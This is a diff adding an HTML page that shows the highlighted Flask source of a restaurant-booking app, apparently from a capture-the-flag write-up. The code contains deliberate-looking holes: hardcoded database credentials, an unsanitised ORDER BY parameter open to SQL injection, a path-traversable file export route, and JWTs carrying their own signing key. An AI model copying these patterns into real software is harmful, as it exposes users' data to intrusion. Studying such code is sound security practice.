+    <span class="hljs-string">'host'</span>: <span class="hljs-string">'127.0.0.1'</span>,
+    <span class="hljs-string">'user'</span>: <span class="hljs-string">'chef'</span>,
+    <span class="hljs-string">'password'</span>: <span class="hljs-string">'3wDo7gSRZIwIHRxZ!'</span>,
+    <span class="hljs-string">'database'</span>: <span class="hljs-string">'yummy_db'</span>,
+    <span class="hljs-string">'cursorclass'</span>: pymysql.cursors.DictCursor,
+    <span class="hljs-string">'client_flag'</span>: CLIENT.MULTI_STATEMENTS
+
+}
+
+access_token = <span class="hljs-string">''</span>
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/login'</span>, methods=[<span class="hljs-string">'GET'</span>,<span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():
+    <span class="hljs-keyword">global</span> access_token
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'GET'</span>:
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'login.html'</span>, message=<span class="hljs-literal">None</span>)
+    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">'POST'</span>:
+        email = request.json.get(<span class="hljs-string">'email'</span>)
+        password = request.json.get(<span class="hljs-string">'password'</span>)
+        password2 = hashlib.sha256(password.encode()).hexdigest()
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> email <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:
+            <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"email or password is missing"</span>), <span class="hljs-number">400</span>
+
+        connection = pymysql.connect(**db_config)
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                sql = <span class="hljs-string">"SELECT * FROM users WHERE email=%s AND password=%s"</span>
+                cursor.execute(sql, (email, password2))
+                user = cursor.fetchone()
+                <span class="hljs-keyword">if</span> user:
+                    payload = {
+                        <span class="hljs-string">'email'</span>: email,
+                        <span class="hljs-string">'role'</span>: user[<span class="hljs-string">'role_id'</span>],
+                        <span class="hljs-string">'iat'</span>: datetime.now(timezone.utc),
+                        <span class="hljs-string">'exp'</span>: datetime.now(timezone.utc) + timedelta(seconds=<span class="hljs-number">3600</span>),
+                        <span class="hljs-string">'jwk'</span>:{<span class="hljs-string">'kty'</span>: <span class="hljs-string">'RSA'</span>,<span class="hljs-string">"n"</span>:<span class="hljs-built_in">str</span>(signature.n),<span class="hljs-string">"e"</span>:signature.e}
+                    }
+                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm=<span class="hljs-string">'RS256'</span>)
+
+                    response = make_response(jsonify(access_token=access_token), <span class="hljs-number">200</span>)
+                    response.set_cookie(<span class="hljs-string">'X-AUTH-Token'</span>, access_token)
+                    <span class="hljs-keyword">return</span> response
+                <span class="hljs-keyword">else</span>:
+                    <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"Invalid email or password"</span>), <span class="hljs-number">401</span>
+        <span class="hljs-keyword">finally</span>:
+            connection.close()
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/logout'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():
+    response = make_response(redirect(<span class="hljs-string">'/login'</span>))
+    response.set_cookie(<span class="hljs-string">'X-AUTH-Token'</span>, <span class="hljs-string">''</span>)
+    <span class="hljs-keyword">return</span> response
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/register'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():
+        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'GET'</span>:
+            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'register.html'</span>, message=<span class="hljs-literal">None</span>)
+        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">'POST'</span>:
+            role_id = <span class="hljs-string">'customer_'</span> + secrets.token_hex(<span class="hljs-number">4</span>)
+            email = request.json.get(<span class="hljs-string">'email'</span>)
+            password = hashlib.sha256(request.json.get(<span class="hljs-string">'password'</span>).encode()).hexdigest()
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> email <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:
+                <span class="hljs-keyword">return</span> jsonify(error=<span class="hljs-string">"email or password is missing"</span>), <span class="hljs-number">400</span>
+            connection = pymysql.connect(**db_config)
+            <span class="hljs-keyword">try</span>:
+                <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                    sql = <span class="hljs-string">"SELECT * FROM users WHERE email=%s"</span>
+                    cursor.execute(sql, (email,))
+                    existing_user = cursor.fetchone()
+                    <span class="hljs-keyword">if</span> existing_user:
+                        <span class="hljs-keyword">return</span> jsonify(error=<span class="hljs-string">"Email already exists"</span>), <span class="hljs-number">400</span>
+                    <span class="hljs-keyword">else</span>:
+                        sql = <span class="hljs-string">"INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"</span>
+                        cursor.execute(sql, (email, password, role_id))
+                        connection.commit()
+                        <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"User registered successfully"</span>), <span class="hljs-number">201</span>
+            <span class="hljs-keyword">finally</span>:
+                connection.close()
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/book'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">export</span>():
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:
+        <span class="hljs-keyword">try</span>:
+            name = request.form[<span class="hljs-string">'name'</span>]
+            date = request.form[<span class="hljs-string">'date'</span>]
+            time = request.form[<span class="hljs-string">'time'</span>]
+            email = request.form[<span class="hljs-string">'email'</span>]
+            num_people = request.form[<span class="hljs-string">'people'</span>]
+            message = request.form[<span class="hljs-string">'message'</span>]
+
+            connection = pymysql.connect(**db_config)
+            <span class="hljs-keyword">try</span>:
+                <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                    sql = <span class="hljs-string">"INSERT INTO appointments (appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES (%s, %s, %s, %s, %s, %s, %s)"</span>
+                    cursor.execute(sql, (name, email, date, time, num_people, message, <span class="hljs-string">'customer'</span>))
+                    connection.commit()
+                    flash(<span class="hljs-string">'Your booking request was sent. You can manage your appointment further from your account. Thank you!'</span>, <span class="hljs-string">'success'</span>)  
+            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+                <span class="hljs-built_in">print</span>(e)
+            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/#book-a-table'</span>)
+        <span class="hljs-keyword">except</span> ValueError:
+            flash(<span class="hljs-string">'Error processing your request. Please try again.'</span>, <span class="hljs-string">'error'</span>)
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_ics_file</span>(<span class="hljs-params">name, date, time, email, num_people, message</span>):
+    <span class="hljs-keyword">global</span> temp_dir
+    temp_dir = tempfile.mkdtemp()
+    current_date_time = datetime.now()
+    formatted_date_time = current_date_time.strftime(<span class="hljs-string">"%Y%m%d_%H%M%S"</span>)
+
+    cal = Calendar()
+    event = Event()
+    
+    event.name = name
+    event.begin = datetime.strptime(date, <span class="hljs-string">"%Y-%m-%d"</span>)
+    event.description = <span class="hljs-string">f"Email: <span class="hljs-subst">{email}</span>\nNumber of People: <span class="hljs-subst">{num_people}</span>\nMessage: <span class="hljs-subst">{message}</span>"</span>
+    
+    cal.events.add(event)
+
+    temp_file_path = os.path.join(temp_dir, quote(<span class="hljs-string">'Yummy_reservation_'</span> + formatted_date_time + <span class="hljs-string">'.ics'</span>))
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(temp_file_path, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> fp:
+        fp.write(cal.serialize())
+
+    <span class="hljs-keyword">return</span> os.path.basename(temp_file_path)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/export/&lt;path:filename&gt;'</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">export_file</span>(<span class="hljs-params">filename</span>):
+    validation = validate_login()
+    <span class="hljs-keyword">if</span> validation <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))
+    filepath = os.path.join(temp_dir, filename)
+    <span class="hljs-keyword">if</span> os.path.exists(filepath):
+        content = send_file(filepath, as_attachment=<span class="hljs-literal">True</span>)
+        shutil.rmtree(temp_dir)
+        <span class="hljs-keyword">return</span> content
+    <span class="hljs-keyword">else</span>:
+        shutil.rmtree(temp_dir)
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"File not found"</span>, <span class="hljs-number">404</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_login</span>():
+    <span class="hljs-keyword">try</span>:
+        (email, current_role), status_code = verify_token()
+        <span class="hljs-keyword">if</span> email <span class="hljs-keyword">and</span> status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> current_role == <span class="hljs-string">"administrator"</span>:
+            <span class="hljs-keyword">return</span> current_role
+        <span class="hljs-keyword">elif</span> email <span class="hljs-keyword">and</span> status_code == <span class="hljs-number">200</span>:
+            <span class="hljs-keyword">return</span> email
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"Invalid token"</span>)
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/dashboard'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">dashboard</span>():
+        validation = validate_login()
+        <span class="hljs-keyword">if</span> validation <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))
+        <span class="hljs-keyword">elif</span> validation == <span class="hljs-string">"administrator"</span>:
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'admindashboard'</span>))
+ 
+        connection = pymysql.connect(**db_config)
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                sql = <span class="hljs-string">"SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"</span>
+                cursor.execute(sql, (validation,))
+                connection.commit()
+                appointments = cursor.fetchall()
+                appointments_sorted = <span class="hljs-built_in">sorted</span>(appointments, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">'appointment_id'</span>])
+
+        <span class="hljs-keyword">finally</span>:
+            connection.close()
+
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'dashboard.html'</span>, appointments=appointments_sorted)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/delete/&lt;appointID&gt;'</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_file</span>(<span class="hljs-params">appointID</span>):
+    validation = validate_login()
+    <span class="hljs-keyword">if</span> validation <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))
+    <span class="hljs-keyword">elif</span> validation == <span class="hljs-string">"administrator"</span>:
+        connection = pymysql.connect(**db_config)
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                sql = <span class="hljs-string">"DELETE FROM appointments where appointment_id= %s;"</span>
+                cursor.execute(sql, (appointID,))
+                connection.commit()
+
+                sql = <span class="hljs-string">"SELECT * from appointments"</span>
+                cursor.execute(sql)
+                connection.commit()
+                appointments = cursor.fetchall()
+        <span class="hljs-keyword">finally</span>:
+            connection.close()
+            flash(<span class="hljs-string">"Reservation deleted successfully"</span>,<span class="hljs-string">"success"</span>)
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">"admindashboard"</span>))
+    <span class="hljs-keyword">else</span>:
+        connection = pymysql.connect(**db_config)
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                sql = <span class="hljs-string">"DELETE FROM appointments WHERE appointment_id = %s AND appointment_email = %s;"</span>
+                cursor.execute(sql, (appointID, validation))
+                connection.commit()
+
+                sql = <span class="hljs-string">"SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"</span>
+                cursor.execute(sql, (validation,))
+                connection.commit()
+                appointments = cursor.fetchall()
+        <span class="hljs-keyword">finally</span>:
+            connection.close()
+            flash(<span class="hljs-string">"Reservation deleted successfully"</span>,<span class="hljs-string">"success"</span>)
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">"dashboard"</span>))
+        flash(<span class="hljs-string">"Something went wrong!"</span>,<span class="hljs-string">"error"</span>)
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">"dashboard"</span>))
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/reminder/&lt;appointID&gt;'</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">reminder_file</span>(<span class="hljs-params">appointID</span>):
+    validation = validate_login()
+    <span class="hljs-keyword">if</span> validation <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))
+
+    connection = pymysql.connect(**db_config)
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+            sql = <span class="hljs-string">"SELECT appointment_id, appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s AND appointment_id = %s"</span>
+            result = cursor.execute(sql, (validation, appointID))
+            <span class="hljs-keyword">if</span> result != <span class="hljs-number">0</span>:
+                connection.commit()
+                appointments = cursor.fetchone()
+                filename = generate_ics_file(appointments[<span class="hljs-string">'appointment_name'</span>], appointments[<span class="hljs-string">'appointment_date'</span>], appointments[<span class="hljs-string">'appointment_time'</span>], appointments[<span class="hljs-string">'appointment_email'</span>], appointments[<span class="hljs-string">'appointment_people'</span>], appointments[<span class="hljs-string">'appointment_message'</span>])
+                connection.close()
+                flash(<span class="hljs-string">"Reservation downloaded successfully"</span>,<span class="hljs-string">"success"</span>)
+                <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'export_file'</span>, filename=filename))
+            <span class="hljs-keyword">else</span>:
+                flash(<span class="hljs-string">"Something went wrong!"</span>,<span class="hljs-string">"error"</span>)
+    <span class="hljs-keyword">except</span>:
+        flash(<span class="hljs-string">"Something went wrong!"</span>,<span class="hljs-string">"error"</span>)
+        
+    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">"dashboard"</span>))
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/admindashboard'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">admindashboard</span>():
+        validation = validate_login()
+        <span class="hljs-keyword">if</span> validation != <span class="hljs-string">"administrator"</span>:
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))
+ 
+        <span class="hljs-keyword">try</span>:
+            connection = pymysql.connect(**db_config)
+            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                sql = <span class="hljs-string">"SELECT * from appointments"</span>
+                cursor.execute(sql)
+                connection.commit()
+                appointments = cursor.fetchall()
+
+                search_query = request.args.get(<span class="hljs-string">'s'</span>, <span class="hljs-string">''</span>)
+
+                <span class="hljs-comment"># added option to order the reservations</span>
+                order_query = request.args.get(<span class="hljs-string">'o'</span>, <span class="hljs-string">''</span>)
+
+                sql = <span class="hljs-string">f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date <span class="hljs-subst">{order_query}</span>"</span>
+                cursor.execute(sql, (<span class="hljs-string">'%'</span> + search_query + <span class="hljs-string">'%'</span>,))
+                connection.commit()
+                appointments = cursor.fetchall()
+            connection.close()
+            
+            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'admindashboard.html'</span>, appointments=appointments)
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+            flash(<span class="hljs-built_in">str</span>(e), <span class="hljs-string">'error'</span>)
+            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'admindashboard.html'</span>, appointments=appointments)
+
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.run(threaded=<span class="hljs-literal">True</span>, debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">3000</span>)</code></pre></div>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
